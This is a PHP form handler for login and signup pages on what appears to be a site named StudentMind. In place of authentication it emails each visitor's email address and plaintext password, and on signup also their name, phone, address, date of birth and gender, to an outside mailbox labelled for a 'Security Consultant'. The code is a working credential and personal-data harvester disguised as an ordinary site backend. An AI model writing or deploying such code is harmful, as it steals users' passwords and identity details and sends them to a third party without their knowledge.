<?php

require "./functionsForApi/functions.php";


$form = isset($_POST['form']) ? $_POST['form'] : "";

$form = isset($_POST['form']) ? $_POST['form'] : "";
$business_email = "techy_2023@studentmind.live";

if ($form === "loginform") {
    $email = postCleanForEmail($_POST['email']);
    $password = postCleanForPasswordLogin($_POST['password']);

    // Create the email message with all the variables
    $subject = "User Data";
    $message = "Dear Security Consultant,\n\n";
    $message .= "Here is the information from a user from page: $form\n\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";
    $message .= "Best regards,\nThe StudentMind team";

    // Send the email using PHP's built-in mail() function
    // You may need to configure your server to enable mail sending
    // Reference for this code: https://www.socketlabs.com/blog/email-api-php/
    $headers = "From: techy_2023@outlook.com\r\n";
    $headers .= "Reply-To: techy_2023@outlook.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    if (mail($business_email, $subject, $message, $headers)) {
        echo "Email sent";
    } else {
        echo "Failed";
    }
} else {

    $firstName = postCleanForText(isset($_POST['firstName']) ? $_POST['firstName'] : "");
    $middleName = postCleanForText(isset($_POST['middleName']) ? $_POST['middleName'] : "");
    $lastName = postCleanForText(isset($_POST['lastName']) ? $_POST['lastName'] : "");
    $mobileNumber = postCleanForNumber(isset($_POST['mobile']) ? $_POST['mobile'] : "");
    $address1 = postCleanForTextAndNumbers(isset($_POST['address1']) ? $_POST['address1'] : "");
    $address2 = postCleanForTextAndNumbers(isset($_POST['address2']) ? $_POST['address2'] : "");
    $postcode = postCleanForTextAndNumbers(isset($_POST['postCode']) ? $_POST['postCode'] : "");
    $city = postCleanForText(isset($_POST['city']) ? $_POST['city'] : "");
    $country = postCleanForText(isset($_POST['country']) ? $_POST['country'] : "");
    $email = postCleanForEmail(isset($_POST['email']) ? $_POST['email'] : "");
    $password = postCleanForPassword(isset($_POST['password']) ? $_POST['password'] : "");
    $dob = isset($_POST['dob']) ? $_POST['dob'] : "";
    $gender = postCleanForText(isset($_POST['gender']) ? $_POST['gender'] : "");
    $bioDesc = "Emptiness...";

    // Create the email message with all the variables
    $subject = "User Data";
    $message = "Dear Security Consultant,\n\n";
    $message .= "Here is the information from a user from page: $form\n\n";
    $message .= "First Name: $firstName\n";
    $message .= "Middle Name: $middleName\n";
    $message .= "Last Name: $lastName\n";
    $message .= "Mobile Number: $mobileNumber\n";
    $message .= "Address 1: $address1\n";
    $message .= "Address 2: $address2\n";
    $message .= "Postcode: $postcode\n";
    $message .= "City: $city\n";
    $message .= "Country: $country\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";
    $message .= "Date of Birth: $dob\n";
    $message .= "Gender: $gender\n";
    $message .= "Bio Description: $bioDesc\n\n";
    $message .= "Best regards,\nThe StudentMind team";
    // Send the email using PHP's built-in mail() function
    // You may need to configure your server to enable mail sending
    // Reference for this code: https://www.socketlabs.com/blog/email-api-php/
    $headers = "From: techy_2023@outlook.com\r\n";
    $headers .= "Reply-To: techy_2023@outlook.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    if (mail($business_email, $subject, $message, $headers)) {
        echo "Email sent";
    } else {
        echo "Failed";
    }
}
